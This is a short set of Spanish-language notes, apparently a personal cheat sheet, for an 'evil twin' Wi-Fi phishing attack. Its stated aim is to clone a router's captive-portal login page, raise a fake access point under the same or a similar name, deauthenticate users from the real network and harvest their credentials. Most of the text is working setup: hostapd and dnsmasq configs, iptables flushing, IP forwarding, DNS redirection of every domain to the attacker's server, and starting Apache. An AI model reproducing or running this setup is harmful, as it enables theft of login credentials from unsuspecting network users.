#Cuando todo falla atacamos a los usuarios
#Clonar la pagina login del portal 
#Crea punto de acceso falso con mismo o similar nombre
#Desautentifica usuarios de la red original 
#mira credenciales 

1. Crear o clonar portal captivo del modem y moverlo al directorio var/www/ de apache 
2. Inciar servicio de apache : service apache2 start 


Componentes de la Red wifi 
1.Router que emite señal->hostapd
2.Servidor DHCP para asignar IPs -> dnsmasq
3.Servidor DNS para asignar solicitudes DNS -> dnsmasq 

#Instalar dnsmask y hostapd
apt-get install hostapd dnsmasq

#Evita que tengamos una buena señal 
service network-manager stop 

#Darles internet a las personas que se conecten a nuestra red
echo 1 > /proc/sys/net/ipv4/ip_forward

#Limpiar tablas de IP para que no aya interferencias
iptables --flush 
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain  
iptables -P FORDWARD ACCEPT


#Crear el archovo de configurcion de dnsmasq.cfg
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,8h #Rango de las IPs
dhcp-option=3,10.0.0.1 #IP de nuestro ROuter -> Gateway
dhcp-option=6,10.0.0.1 #IP de nuestro servidor DNS
address=/#/10.0.0.1 #Para redireccionar a nuestro servidor 

#Crear el archivo de configuracion de hostapd.cfg
interface=wlan0
ssid=portal2 #NOmbre de la red que queremos puede ser el mismo nombre o portal_v2 
channel=1 #Canal de la Red
driver=nl80211


dnsmasq -C dnsmasq.cfg
hostapd hostapd.cfg -B

service apache2 start

ifconfig wlan0 10.0.0.1 netmask 255.255.255.0